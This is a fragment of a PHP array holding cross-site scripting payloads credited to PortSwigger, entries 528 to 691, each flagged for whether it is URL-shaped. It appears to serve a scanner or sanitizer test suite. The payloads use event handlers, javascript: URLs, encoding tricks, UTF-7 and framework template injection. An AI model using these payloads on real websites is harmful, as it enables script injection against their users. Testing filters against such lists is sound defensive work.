                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-528' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=throw/**/self.onerror=&#97lert,1>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-529' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=throw/**/frames.onerror=&#97lert,1>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-530' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=throw/**/globalThis.onerror=&#97lert,1>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-531' => [
                'payload' => '<xss tabindex=1 autofocus onfocus="throw self.onerror=&#97lert,1">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-532' => [
                'payload' => '<xss tabindex=1 autofocus onfocus="throw frames.onerror=&#97lert,1">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-533' => [
                'payload' => '<xss tabindex=1 autofocus onfocus="throw globalThis.onerror=&#97lert,1">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-534' => [
                'payload' => '<xss tabindex=1 autofocus onfocus="throw defaultView.onerror=&#97lert,1">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-535' => [
                'payload' => '<xss title=aler id=t tabindex=1 autofocus onfocus="throw defaultView.onerror=defaultView[title+id],1">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-536' => [
                'payload' => '<xss title=aler id=t tabindex=1 autofocus onfocus=throw&Tab;defaultView.onerror=defaultView[title+id],1>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-537' => [
                'payload' => '<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32defaultView.onerror=defaultView[title+id],1>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-538' => [
                'payload' => '<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32self.onerror=self[title+id],1>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-539' => [
                'payload' => '<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32globalThis.onerror=globalThis[title+id],1>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-540' => [
                'payload' => '<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32frames.onerror=frames[title+id],1>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-541' => [
                'payload' => '<xss title=java id=script:ale class=rt&lpar;1&rpar; tabindex=1 autofocus onfocus=location=title+id+className>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-542' => [
                'payload' => '<xss title=java id=script:ale class=rt&#40;1&#41; tabindex=1 autofocus onfocus=location=title+id+className>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-543' => [
                'payload' => '<xss title=java id=script:ale class=rt&#x28;1&#x29; tabindex=1 autofocus onfocus=location=title+id+className>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-544' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=window[\'a\'+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-545' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=window[`a`+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-546' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=\\u0061lert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-547' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=\\u{0061}lert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-548' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=\\u{61}lert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-549' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=\\u{00000000000061}lert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-550' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[\'a\'+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-551' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[`${`a`}lert`](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-552' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[\'\\a\'+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-553' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[\'\\x61\'+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-554' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[\'\\141\'+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-555' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[/a/.source+/lert/.source](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-556' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[atob.name[0]+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-557' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[String.fromCharCode(0x61)+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-558' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[String.fromCodePoint(0x61)+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-559' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[10..toString(17)+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-560' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[10n.toString(17)+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-561' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[0xa.toString(17)+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-562' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[0b1010.toString(17)+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-563' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[0o12.toString(17)+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-564' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[atob(\'YQ==\')+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-565' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[unescape(\'%61\')+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-566' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[decodeURI(\'%61\')+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-567' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[decodeURIComponent(\'%61\')+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-568' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=self[\'a\'+[]+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-569' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=frames[\'a\'+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-570' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=defaultView[10n.toString(17)+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-571' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=defaultView[0xa.toString(17)+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-572' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=defaultView[0b1010.toString(17)+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-573' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=defaultView[0o12.toString(17)+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-574' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=defaultView[atob(\'YQ==\')+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-575' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=defaultView[unescape(\'%61\')+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-576' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=defaultView[decodeURI(\'%61\')+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-577' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=defaultView[decodeURIComponent(\'%61\')+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-578' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=defaultView[\'a\'+[]+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-579' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=defaultView[\'a\'+\'lert\'](1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-580' => [
                'payload' => '<script>Object.prototype.message=\'alert\\x281337\\x29\';Array.prototype.toString=Error.prototype.toString;Error.prepareStackTrace = Function;const x = new Error;x.valueOf=x.stack;+x;</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-581' => [
                'payload' => '<xss class=progress-bar-animated onanimationstart=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-582' => [
                'payload' => '<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-583' => [
                'payload' => '<iframe src="javascript:alert(1)">',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-584' => [
                'payload' => '<a href="javascript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-585' => [
                'payload' => '<a href="JaVaScript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-586' => [
                'payload' => '<a href=" 	javascript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-587' => [
                'payload' => '<a href="javas	cript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-588' => [
                'payload' => '<a href="javascript',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-589' => [
                'payload' => ':alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-590' => [
                'payload' => '<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-591' => [
                'payload' => '<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-592' => [
                'payload' => '<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-593' => [
                'payload' => '<svg><set xlink:href=#x attributeName=href to=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-594' => [
                'payload' => '<script src="data:text/javascript,alert(1)"></script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-595' => [
                'payload' => '<svg><script href="data:text/javascript,alert(1)" />',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-596' => [
                'payload' => '<script>import(\'data:text/javascript,alert(1)\')</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-597' => [
                'payload' => '<math><x href="javascript:alert(1)">blah',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-598' => [
                'payload' => '<form><button formaction=javascript:alert(1)>XSS',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-599' => [
                'payload' => '<form><input type=submit formaction=javascript:alert(1) value=XSS>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-600' => [
                'payload' => '<form action=javascript:alert(1)><input type=submit value=XSS>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-601' => [
                'payload' => '<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-602' => [
                'payload' => '<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-603' => [
                'payload' => '<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-604' => [
                'payload' => '<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-605' => [
                'payload' => '<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-606' => [
                'payload' => '<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-607' => [
                'payload' => '<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-608' => [
                'payload' => '<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-609' => [
                'payload' => '<form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-610' => [
                'payload' => '<input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-611' => [
                'payload' => '<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-612' => [
                'payload' => '<a href=# download="filename.html">Test</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-613' => [
                'payload' => '<img referrerpolicy="no-referrer" src="//portswigger-labs.net">',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-614' => [
                'payload' => '<a href=# onclick="window.open(\'http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//\',\'alert(1)\')">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-615' => [
                'payload' => '<iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-616' => [
                'payload' => '<base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-617' => [
                'payload' => '<a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-618' => [
                'payload' => '<img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-619' => [
                'payload' => '<form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="\';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-620' => [
                'payload' => '<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-621' => [
                'payload' => '<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-622' => [
                'payload' => '<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-623' => [
                'payload' => '+/v8',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-624' => [
                'payload' => '+ADw-script+AD4-alert(1)+ADw-/script+AD4-',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-625' => [
                'payload' => '+/v9',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-626' => [
                'payload' => '+/v+',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-627' => [
                'payload' => '+/v/',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-628' => [
                'payload' => '<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-629' => [
                'payload' => '<iframe sandbox src="//portswigger-labs.net"></iframe>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-630' => [
                'payload' => '<meta name="referrer" content="no-referrer">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-631' => [
                'payload' => '%C0%BCscript>alert(1)</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-632' => [
                'payload' => '%E0%80%BCscript>alert(1)</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-633' => [
                'payload' => '%F0%80%80%BCscript>alert(1)</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-634' => [
                'payload' => '%F8%80%80%80%BCscript>alert(1)</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-635' => [
                'payload' => '%FC%80%80%80%80%BCscript>alert(1)</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-636' => [
                'payload' => '<script>\\u0061lert(1)</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-637' => [
                'payload' => '<script>\\u{61}lert(1)</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-638' => [
                'payload' => '<script>\\u{0000000061}lert(1)</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-639' => [
                'payload' => '<script>eval(\'\\x61lert(1)\')</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-640' => [
                'payload' => '<script>eval(\'\\141lert(1)\')</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-641' => [
                'payload' => '<script>eval(\'alert(\\061)\')</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-642' => [
                'payload' => '<script>eval(\'alert(\\61)\')</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-643' => [
                'payload' => '<a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-644' => [
                'payload' => '<svg><script>&#97;lert(1)</script></svg>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-645' => [
                'payload' => '<svg><script>&#x61;lert(1)</script></svg>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-646' => [
                'payload' => '<svg><script>alert&NewLine;(1)</script></svg>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-647' => [
                'payload' => '<svg><script>x="&quot;,alert(1)//";</script></svg>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-648' => [
                'payload' => '<a href="&#0000106avascript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-649' => [
                'payload' => '<a href="&#x6a;avascript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-650' => [
                'payload' => '<a href="j&#x61vascript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-651' => [
                'payload' => '<a href="&#x6a',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-652' => [
                'payload' => 'avascript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-653' => [
                'payload' => '<a href="&#x6a avascript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-654' => [
                'payload' => '<a href="&#x0000006a;avascript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-655' => [
                'payload' => '<a href="&#X6A;avascript:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-656' => [
                'payload' => '<a href="javascript&colon;alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-657' => [
                'payload' => '<a href="java&Tab;script:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-658' => [
                'payload' => '<a href="java&NewLine;script:alert(1)">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-659' => [
                'payload' => '<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-660' => [
                'payload' => '<a href="javascript:x=\'%27-alert(1)-%27\';">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-661' => [
                'payload' => '<a href="javascript:x=\'&percnt;27-alert(1)-%27\';">XSS</a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-662' => [
                'payload' => '<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-663' => [
                'payload' => '<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-664' => [
                'payload' => '<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-665' => [
                'payload' => '<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-666' => [
                'payload' => '<iframe src="javascript:\'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;\'"></iframe>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-667' => [
                'payload' => '<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-668' => [
                'payload' => '<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-669' => [
                'payload' => '{{constructor.constructor(\'alert(1)\')()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-670' => [
                'payload' => '<div v-html="\'\'.constructor.constructor(\'alert(1)\')()">a</div>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-671' => [
                'payload' => '<x v-html=_c.constructor(\'alert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-672' => [
                'payload' => '<x v-if=_c.constructor(\'alert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-673' => [
                'payload' => '{{_c.constructor(\'alert(1)\')()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-674' => [
                'payload' => '{{_v.constructor(\'alert(1)\')()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-675' => [
                'payload' => '{{_s.constructor(\'alert(1)\')()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-676' => [
                'payload' => '<p v-show="_c.constructor`alert(1)`()">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-677' => [
                'payload' => '<x v-on:click=\'_b.constructor`alert(1)`()\'>click</x>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-678' => [
                'payload' => '<x v-bind:a=\'_b.constructor`alert(1)`()\'>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-679' => [
                'payload' => '<x @[_b.constructor`alert(1)`()]>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-680' => [
                'payload' => '<x :[_b.constructor`alert(1)`()]>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-681' => [
                'payload' => '<p v-=_c.constructor`alert(1)`()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-682' => [
                'payload' => '<x #[_c.constructor`alert(1)`()]>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-683' => [
                'payload' => '<p :=_c.constructor`alert(1)`()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-684' => [
                'payload' => '{{_b.constructor`alert(1)`()}}',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-685' => [
                'payload' => '<x v-bind:is="\'script\'" src="//14.rs" />',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-686' => [
                'payload' => '<x is=script src=//⑭.₨>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-687' => [
                'payload' => '<x @click=\'_b.constructor`alert(1)`()\'>click</x>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-688' => [
                'payload' => '<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-689' => [
                'payload' => '<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-690' => [
                'payload' => '<xyz<img/src onerror=alert(1)>>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-691' => [
                'payload' => '<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
